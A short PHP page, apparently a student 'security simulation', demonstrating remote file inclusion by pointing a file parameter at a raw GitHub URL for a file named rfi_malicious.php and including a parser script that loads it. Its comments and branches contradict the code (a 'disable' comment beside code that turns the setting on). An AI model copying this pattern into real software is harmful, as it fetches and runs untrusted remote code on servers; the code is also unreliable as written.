<!DOCTYPE html>
<html>

<head>
    <title>Security Simulation</title>
    <link rel="stylesheet" href="style/base.css">
</head>

<body>
    <div class="container">
        <?php
        // Check if allow_url_include is enabled
        if (ini_get('allow_url_include')) {
            // Disable allow_url_include in php.ini
            ini_set('allow_url_include', 'On');
            ?>
            <h1>Security Simulation Activated</h1>
            <p>This is a simulation. We have set 'allow_url_include' to On in php.ini.<br>
                This is a security risk because it allows executing any file on the server if the parameter in php.ini is
                set to On.<br>
                We have uploaded a malicious file on a public repository on GitHub and we are going to execute it.</p>
            <?php
        } else {
            ?>
            <h1>Configuration Notice</h1>
            <p>allow_url_include is already set to On in php.ini.</p>
            <?php
        }

        // Set the file parameter to the malicious file URL
        $_GET['file'] = 'https://raw.githubusercontent.com/Kotsudes/devinci-cracks/main/view/rfi_malicious.php';
        ?>
        <p>Executing the file:
            <?php echo htmlspecialchars($_GET['file']); ?>
        </p>
        <?php
        // Include the rfi_parse.php script
        include('rfi_parse.php');
        ?>
    </div>
</body>

</html>